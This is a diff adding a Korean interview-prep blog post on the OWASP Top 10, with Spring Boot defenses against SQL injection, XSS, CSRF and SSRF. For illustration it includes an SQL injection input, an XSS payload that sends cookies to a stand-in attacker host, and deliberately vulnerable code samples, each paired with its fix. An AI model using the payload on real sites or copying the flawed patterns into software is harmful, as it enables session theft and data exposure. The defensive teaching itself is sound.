@@ -1,0 +1,262 @@
+---
+title: "웹 보안 & OWASP Top 10 — 면접 대비 정리"
+description: "SQL Injection, XSS, CSRF, SSRF, XXE, 인증 취약점까지. OWASP Top 10 기준으로 공격 원리와 Spring Boot에서의 방어 방법을 정리한다."
+date: "2026-04-02"
+category: "Security"
+tags: ["보안", "OWASP", "SQL Injection", "XSS", "CSRF", "Spring Security"]
+series: "면접 대비"
+seriesOrder: 23
+---
+
+## OWASP Top 10 (2021)
+
+1. Broken Access Control
+2. Cryptographic Failures
+3. Injection (SQL, LDAP, OS Command)
+4. Insecure Design
+5. Security Misconfiguration
+6. Vulnerable Components
+7. Authentication Failures
+8. Software & Data Integrity Failures
+9. Security Logging Failures
+10. SSRF
+
+---
+
+## SQL Injection
+
+사용자 입력이 SQL 쿼리에 그대로 삽입될 때 발생.
+
+```java
+// 취약한 코드
+String query = "SELECT * FROM users WHERE email = '" + email + "'";
+
+// 공격자 입력: ' OR '1'='1
+// 결과 쿼리: SELECT * FROM users WHERE email = '' OR '1'='1'
+// → 모든 사용자 조회됨
+```
+
+```java
+// 방어: PreparedStatement (파라미터 바인딩)
+String query = "SELECT * FROM users WHERE email = ?";
+PreparedStatement stmt = conn.prepareStatement(query);
+stmt.setString(1, email);  // 입력값이 SQL로 해석 안 됨
+```
+
+**JPA / Spring Data**:
+
+```java
+// 안전: 파라미터 바인딩
+@Query("SELECT u FROM User u WHERE u.email = :email")
+Optional<User> findByEmail(@Param("email") String email);
+
+// 위험: 문자열 직접 조합
+@Query("SELECT u FROM User u WHERE u.email = '" + email + "'")  // 절대 금지
+```
+
+**QueryDSL**: 빌더 패턴으로 파라미터 바인딩이 자동. SQL Injection 안전.
+
+---
+
+## XSS (Cross-Site Scripting)
+
+악성 스크립트를 사용자 브라우저에서 실행시키는 공격.
+
+```html
+<!-- 공격자가 게시판에 입력 -->
+<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
+
+<!-- 이 글을 다른 사용자가 보면 → 쿠키 탈취 -->
+```
+
+**방어**:
+
+```java
+// 1. 출력 시 HTML 인코딩
+String safe = HtmlUtils.htmlEscape(userInput);
+// < → &lt;  > → &gt;  " → &quot;  ' → &#x27;
+
+// 2. Spring Security 기본 헤더
+// X-XSS-Protection, Content-Security-Policy 자동 설정
+
+// 3. CSP (Content Security Policy) 헤더
+http.headers(headers -> headers
+    .contentSecurityPolicy(csp -> csp
+        .policyDirectives("default-src 'self'; script-src 'self'")
+    ));
+```
+
+---
+
+## CSRF (Cross-Site Request Forgery)
+
+인증된 사용자의 브라우저를 통해 의도치 않은 요청을 보내는 공격.
+
+```
+1. 사용자가 은행 사이트에 로그인 (세션 쿠키 저장됨)
+2. 공격자 사이트 방문
+3. 공격자 사이트에 숨겨진 폼이 은행 사이트로 자동 POST 요청
+   → 브라우저가 세션 쿠키를 자동으로 포함해 보냄
+4. 은행 서버는 정상 요청으로 착각
+```
+
+**방어**:
+
+```java
+// 1. CSRF 토큰 (Spring Security 기본 활성화)
+http.csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()));
+// 모든 POST/PUT/DELETE 요청에 CSRF 토큰 필요
+
+// 2. SameSite 쿠키 설정
+server:
+  servlet:
+    session:
+      cookie:
+        same-site: strict  # 다른 사이트에서 쿠키 전송 안 함
+
+// 3. REST API + JWT: CSRF 비활성화 가능
+// JWT는 쿠키가 아닌 헤더로 전송 → 자동 포함 안 됨
+http.csrf(csrf -> csrf.disable());
+```
+
+---
+
+## 인증 취약점
+
+### 브루트 포스 공격 방어
+
+```java
+// Rate Limiting: 로그인 실패 횟수 제한
+@Service
+public class LoginAttemptService {
+    private final Cache<String, Integer> attemptsCache = CacheBuilder.newBuilder()
+        .expireAfterWrite(15, TimeUnit.MINUTES)
+        .build();
+
+    public void loginFailed(String ip) {
+        int attempts = attemptsCache.getIfPresent(ip) == null ? 0 : attemptsCache.getIfPresent(ip);
+        attemptsCache.put(ip, attempts + 1);
+    }
+
+    public boolean isBlocked(String ip) {
+        return attemptsCache.getIfPresent(ip) != null && attemptsCache.getIfPresent(ip) >= 5;
+    }
+}
+```
+
+### 비밀번호 저장
+
+```java
+// 절대 금지: 평문 저장
+user.setPassword(password);
+
+// 금지: MD5, SHA1 (레인보우 테이블 공격)
+user.setPassword(DigestUtils.md5Hex(password));
+
+// 권장: BCrypt (느리고, Salt 내장)
+PasswordEncoder encoder = new BCryptPasswordEncoder(12);  // strength: 12
+String hashed = encoder.encode(password);
+boolean matches = encoder.matches(rawPassword, hashed);
+```
+
+BCrypt는 의도적으로 느리게 설계됐다 (strength 12 ≈ 수십ms). 브루트 포스를 막는다.
+
+---
+
+## SSRF (Server-Side Request Forgery)
+
+서버가 공격자가 지정한 URL로 요청을 보내도록 유도.
+
+```
+공격자 → 우리 서버 API (url 파라미터 전달)
+       → 우리 서버가 내부 네트워크에 요청
+       → AWS 메타데이터 서버(169.254.169.254) 등 접근
+       → IAM 자격증명, 내부 서비스 노출
+```
+
+```java
+// 취약한 코드
+public String fetchUrl(String url) throws IOException {
+    URL connection = new URL(url);  // url 검증 없음
+    return new String(connection.openStream().readAllBytes());
+}
+
+// 방어: URL 허용 목록 (Allowlist)
+private static final List<String> ALLOWED_HOSTS = List.of("api.example.com", "cdn.example.com");
+
+public String fetchUrl(String urlStr) throws IOException {
+    URL url = new URL(urlStr);
+    if (!ALLOWED_HOSTS.contains(url.getHost())) {
+        throw new SecurityException("허용되지 않은 호스트: " + url.getHost());
+    }
+    // ...
+}
+```
+
+---
+
+## 민감 정보 노출
+
+```java
+// 금지: 에러 메시지에 내부 정보 노출
+{
+  "error": "org.postgresql.util.PSQLException: FATAL: password authentication failed for user 'prod_user'",
+  "stack": "at org.postgresql.Driver.connect..."
+}
+
+// 권장: 사용자에게는 일반 메시지, 내부적으로 상세 로그
+@ExceptionHandler(Exception.class)
+public ResponseEntity<ErrorResponse> handleException(Exception e) {
+    log.error("Unexpected error", e);  // 내부 로그에 상세
+    return ResponseEntity.status(500)
+        .body(new ErrorResponse("서버 오류가 발생했습니다."));  // 외부에는 일반 메시지
+}
+```
+
+---
+
+## 의존성 취약점 관리
+
+```gradle
+// OWASP Dependency Check 플러그인
+plugins {
+    id "org.owasp.dependencycheck" version "9.0.0"
+}
+
+// 알려진 CVE가 있는 의존성 감지
+./gradlew dependencyCheckAnalyze
+```
+
+---
+
+## 보안 헤더
+
+Spring Security 기본 설정:
+
+```
+X-Content-Type-Options: nosniff           (MIME 타입 스니핑 방지)
+X-Frame-Options: DENY                      (클릭재킹 방지)
+X-XSS-Protection: 0                       (최신 브라우저는 CSP 사용)
+Strict-Transport-Security: max-age=...    (HTTPS 강제)
+Cache-Control: no-cache, no-store         (민감 페이지 캐시 방지)
+```
+
+---
+
+## 면접에서 자주 나오는 질문
+
+**Q. SQL Injection을 방어하는 방법은?**
+
+PreparedStatement의 파라미터 바인딩을 사용한다. 사용자 입력을 SQL 문자열에 직접 연결하지 않는다. JPA, QueryDSL 같은 ORM은 파라미터 바인딩이 자동으로 처리된다. 추가로 최소 권한 DB 계정을 사용해 공격 성공 시 피해를 제한한다.
+
+**Q. XSS와 CSRF의 차이는?**
+
+XSS는 악성 스크립트를 피해자 브라우저에서 실행시켜 쿠키/세션을 탈취한다. CSRF는 인증된 사용자의 브라우저를 통해 피해자 의사와 무관한 요청을 서버에 보낸다. XSS는 스크립트 실행이 목적, CSRF는 위조 요청이 목적이다.
+
+**Q. JWT를 사용하면 CSRF를 왜 걱정 안 해도 되는가?**
+
+CSRF는 브라우저가 쿠키를 자동으로 포함해 전송하는 특성을 악용한다. JWT는 쿠키가 아닌 Authorization 헤더로 전송한다. 악성 사이트의 자동 폼 제출은 헤더를 추가할 수 없으므로 JWT가 포함되지 않는다.
+
+**Q. 비밀번호를 해시할 때 왜 BCrypt를 쓰는가?**
+
+MD5, SHA는 빠르게 연산되어 브루트 포스에 취약하다. BCrypt는 의도적으로 느리게 설계됐고(cost factor로 조절 가능), Salt를 내장해 같은 비밀번호도 항상 다른 해시가 생성된다. 레인보우 테이블 공격을 방지한다.
